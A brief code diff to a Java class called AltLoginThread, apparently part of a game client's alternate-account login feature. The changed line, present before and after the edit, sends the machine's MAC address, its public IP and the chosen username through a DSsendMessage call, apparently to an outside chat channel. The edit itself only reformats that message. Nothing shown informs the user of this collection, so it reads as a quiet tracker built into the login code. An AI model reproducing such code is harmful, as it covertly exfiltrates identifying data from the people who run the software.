@@ -86,7 +86,7 @@ public final class AltLoginThread extends Thread {
             String macAddress = String.join("-", hexadecimal);
 
             try {
-                DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Changed Nick To [" + this.username +  "]]", true, Color.GREEN);
+                DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "Changed Nick To [" + this.username +  "]", true, Color.GREEN);
             } catch (Exception e) {
                 e.printStackTrace();
             }
